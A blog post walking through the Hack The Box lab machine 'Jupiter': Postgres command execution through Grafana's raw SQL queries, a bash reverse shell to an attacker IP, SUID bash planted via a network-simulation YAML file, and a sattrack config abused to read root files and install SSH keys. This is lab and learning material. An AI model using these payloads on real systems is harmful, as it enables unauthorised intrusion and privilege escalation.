---
layout: post
title: "HTB: Jupiter"
author: Andrew Cherney
date: 2023-10-22 12:19:03
tags: htb medium-box postgres yaml binary
icon: "assets/icons/jupiter.png"
post_description: "This box started by finding raw SQL queries within a Grafana service. After abusing that query we can gain RCE and thusly a shell. Next a network testing script with an SUID bit can be abused to pivot to a user. An SSH tunnel can be used to access the locally hosted Jupyter notetaking service, which contains a python interpreter to pivot to another user. Finally a sudo permission can be leveraged to access root files and download an auth_keys file into root's ssh folder."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

<h2>nmap</h2>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Jupiter]
└──╼ $nmap -sC -Pn 10.10.11.216
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-26 19:44 CDT
Nmap scan report for 10.10.11.216
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://jupiter.htb/
```

<h2>Port 80 - http</h2>

{% include img_link src="/img/jupiter/jupiter_front_page" alt="front_page" ext="png" trunc=500 %}

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Jupiter]
└──╼ $ffuf -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://jupiter.htb -H "Host: FUZZ.jupiter.htb" -mc 200,401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jupiter.htb
 :: Wordlist         : FUZZ: /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.jupiter.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401
________________________________________________

kiosk                   [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 74ms]
:: Progress: [114441/114441] :: Job [1/1] :: 298 req/sec :: Duration: [0:03:12] :: Errors: 0 ::
```

Head to that new subdomain and it redirects to a grafana page at the url `http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d`


![grafana page](/img/jupiter/jupiter_graphana.png)

I do another directory search and come across the following:

```
http://kiosk.jupiter.htb/metrics
http://kiosk.jupiter.htb/healthz
http://kiosk.jupiter.htb/robots.txt
http://kiosk.jupiter.htb/swagger-ui
```

swagger-ui in this instance is used as a UI to manipulate databases, but I don't have permissions to do almost anything here so we'll shelf that for later. 

<h1>User as juno</h1>

<h2>Postgres Injection</h2>

Heading back to grafana I check the requests sent to the database this is pulling data from and see straight postgres commands heading to the endpoint /api/ds/query.


```json
{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Saturn';","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":453}],"range":{"from":"2023-09-26T19:11:08.900Z","to":"2023-09-27T01:11:08.900Z","raw":{"from":"now-6h","to":"now"}},"from":"1695755468900","to":"1695777068900"}
```

There is an exploit for specific versions of postgres to give me RCE on this machine, and instead of checking the version I craft a command using [https://www.exploit-db.com/exploits/50847](https://www.exploit-db.com/exploits/50847) and throw it in. Rigidly speaking this wasn't labelled as a vulnerability by the development team but this is effectively unauthenticated RCE.

```
DROP TABLE IF EXISTS raccoon; \n CREATE TABLE raccoon(cmd_output text); \n COPY raccoon FROM PROGRAM 'wget http://10.10.14.2:8081/test'; \n SELECT * FROM raccoon;
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Jupiter]
└──╼ $python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.216 - - [26/Sep/2023 20:28:21] code 404, message File not found
10.10.11.216 - - [26/Sep/2023 20:28:21] "GET /test HTTP/1.1" 404 -
```

And it turns out to be vulnerable, and after reading the CVE regular postgres might be vulnerable as well. Time to modify my command for a reverse shell and get a shell as postgres.

```json
{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS raccoon; \n CREATE TABLE raccoon(cmd_output text); \n COPY raccoon FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.2/7777 0>&1\"'; \n SELECT * FROM raccoon;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":453}],"range":{"from":"2023-09-26T19:11:08.900Z","to":"2023-09-27T01:11:08.900Z","raw":{"from":"now-6h","to":"now"}},"from":"1695755468900","to":"1695777068900"}
```


```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Jupiter]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.216 43486
bash: cannot set terminal process group (1418): Inappropriate ioctl for device
bash: no job control in this shell
postgres@jupiter:/var/lib/postgresql/14/main$ whoami
whoami
postgres
```

<h2>yml command injection</h2>

```bash
find / -user juno 2>/dev/null
/dev/shm/shadow.data
/dev/shm/shadow.data/sim-stats.json
/dev/shm/shadow.data/processed-config.yaml
/dev/shm/shadow.data/hosts
/dev/shm/shadow.data/hosts/server
/dev/shm/shadow.data/hosts/server/server.python3.10.1000.exitcode
/dev/shm/shadow.data/hosts/server/server.python3.10.1000.shimlog
/dev/shm/shadow.data/hosts/server/server.python3.10.1000.stderr
/dev/shm/shadow.data/hosts/server/server.python3.10.1000.stdout
/dev/shm/shadow.data/hosts/client3
/dev/shm/shadow.data/hosts/client3/client3.curl.1000.exitcode
/dev/shm/shadow.data/hosts/client3/client3.curl.1000.shimlog
/dev/shm/shadow.data/hosts/client3/client3.curl.1000.stderr
/dev/shm/shadow.data/hosts/client3/client3.curl.1000.stdout
/dev/shm/shadow.data/hosts/client2
/dev/shm/shadow.data/hosts/client2/client2.curl.1000.exitcode
/dev/shm/shadow.data/hosts/client2/client2.curl.1000.shimlog
/dev/shm/shadow.data/hosts/client2/client2.curl.1000.stderr
/dev/shm/shadow.data/hosts/client2/client2.curl.1000.stdout
/dev/shm/shadow.data/hosts/client1
/dev/shm/shadow.data/hosts/client1/client1.curl.1000.exitcode
/dev/shm/shadow.data/hosts/client1/client1.curl.1000.shimlog
/dev/shm/shadow.data/hosts/client1/client1.curl.1000.stderr
/dev/shm/shadow.data/hosts/client1/client1.curl.1000.stdout
/dev/shm/network-simulation.yml
/home/juno
```

After looking for files that stand out the yml file of network-simulation takes the award. And it is writable as postgres. The file contains basic client-server connectivity tests, the server of which starts 3 seconds after running and the clients start 5 seconds after. This means I can place a command to copy bash to a location in server and have the client add the SUID bit. 

```bash
echo "general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s" > network-simulation.yml
```

Wait a little bit of time and run `bash -p` to gain shell as the owner: juno.

```bash
postgres@jupiter:/dev/shm$ /tmp/bash -p
/tmp/bash -p
ls
network-simulation.yml
network-simulation.yml.1
PostgreSQL.3401771544
shadow.data
whoami
juno
```

And so I never have to execute that chain of exploits to gain user again I added an ssh key, which in a few more sentences you'll find was important.


```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Jupiter]
└──╼ $ssh juno@jupiter.htb -i juno
The authenticity of host 'jupiter.htb (10.10.11.216)' can't be established.
ECDSA key fingerprint is SHA256:CambiqQQfxj+zMMNNKGU+11Xrc9my7zEvX0GSfzRJVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'jupiter.htb,10.10.11.216' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)

--------------
Last login: Wed Jun  7 15:13:15 2023 from 10.10.14.23
juno@jupiter:~$ cat user.txt
e33ed06b07----------------------
```


<h1>User as jovian</h1>

<h2>jupyter</h2>

While enumerating before I came across a directory of `/opt/solar-flares` that contains scripts and logs, and I check a log to find a potential token.

```bash
juno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-03-08-14.log 
[W 13:14:40.718 NotebookApp] Terminals not available (error was No module named 'terminado')
[I 13:14:40.727 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
[I 13:14:40.727 NotebookApp] Jupyter Notebook 6.5.3 is running at:
[I 13:14:40.727 NotebookApp] http://localhost:8888/?token=b8055b937eeb17431b3f00dfc5159ba909012d86be120b60
[I 13:14:40.727 NotebookApp]  or http://127.0.0.1:8888/?token=b8055b937eeb17431b3f00dfc5159ba909012d86be120b60
[I 13:14:40.727 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
[W 13:14:40.729 NotebookApp] No web browser found: could not locate runnable browser.
[C 13:14:40.729 NotebookApp] 
    
    To access the notebook, open this file in a browser:
        file:///home/jovian/.local/share/jupyter/runtime/nbserver-865-open.html
    Or copy and paste one of these URLs:
        http://localhost:8888/?token=b8055b937eeb17431b3f00dfc5159ba909012d86be120b60
     or http://127.0.0.1:8888/?token=b8055b937eeb17431b3f00dfc5159ba909012d86be120b60

```

The more ocularily inclined of you will notice there is a localhost service running on port 8888, I didn't notice that until checking out netstat. But that cool ssh key we setup now comes in handy for ssh tunneling that port to my local machine.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Jupiter]
└──╼ $ssh juno@jupiter.htb -i juno -L 8888:127.0.0.1:8888
```

![jupyter notebook front page](/img/jupiter/jupiter_jupyter.png)

There's where that token comes in handy, and after a login I see a familiar host of scripts and directory. 

![jupyter login](/img/jupiter/jupiter_jupyter_login.png)


I have the ability to edit any of those files here and create new ones, but there is no way for me to change permissions or force this script to run with another's permissions, so I look elsewhere.

Which brought me to the python interpreter locally hosted in the jupyter service.

![jupyter python int](/img/jupiter/jupiter_jupyter_python_int.png)

And there is my command execution as jovian, now I'll repurpose my reverse shell I made earlier. Except that wasn't what worked and I tried to get it to work but I think the restrictions on either python or the local service were getting in the way. I used the cp bash and SUID bit adding method instead.

![jupyter raccoonbash](/img/jupiter/jupiter_jupyter_jovianbash.png)


<h1>Root</h1>

<h2>sattrack binary</h2>

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Jupiter]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.216 51346
bash: cannot set terminal process group (2941): Inappropriate ioctl for device
bash: no job control in this shell

jovian@jupiter:~$ sudo -l
sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
jovian@jupiter:~$ sattrack -h
sattrack -h
Satellite Tracking System
Configuration file has not been found. Please try again!
```

I try to create my own config file that this binary needs, until I realize I can search for it and save myself hours of fuzzing.

```bash
jovian@jupiter:/opt/solar-flares$ find / -name config.json 2>/dev/null
find / -name config.json 2>/dev/null
/usr/local/share/sattrack/config.json
/usr/local/lib/python3.10/dist-packages/zmq/utils/config.json
jovian@jupiter:/opt/solar-flares$ cat /usr/local/share/sattrack/config.json
cat /usr/local/share/sattrack/config.json
{
	"tleroot": "/tmp/tle/",
	"tlefile": "weather.txt",
	"mapfile": "/usr/local/share/sattrack/map.json",
	"texturefile": "/usr/local/share/sattrack/earth.png",
	
	"tlesources": [
		"http://celestrak.org/NORAD/elements/weather.txt",
		"http://celestrak.org/NORAD/elements/noaa.txt",
		"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}
```

The tlesources seem injectable with file:/// or my own server hosted file. So naturally I tried 3 different options to see what bites.

```
{
	"tleroot": "/tmp/tle/",
	"tlefile": "weather.txt",
	"mapfile": "/usr/local/share/sattrack/map.json",
	"texturefile": "/usr/local/share/sattrack/earth.png",
	
	"tlesources": [
		"http://10.10.14.2:8080/raccoonbash",
		"file:///root/root.txt",
		"file:///root/.ssh/id_rsa"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}
```

Got a bite on my server, and got root flag.

```bash
juno@jupiter:/tmp/tle$ ls
'gp.php?GROUP=starlink&FORMAT=tle'   id_rsa   noaa.txt   raccoonbash   root.txt
juno@jupiter:/tmp/tle$ cat root.txt
945e04d8fbd----------------------
```

<h1>SSH to Root</h1>

But that was only the root flag, and I wasn't done just yet. Within sattrack we have the ability to set the root directory for the files to go into, and with that we can access a remotely hosted authorized_keys files for ssh access. The modified parts of the config would be as follows:

```
        "tleroot": "/root/.ssh/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "http://10.10.14.2/authorized_keys"
        ],
```
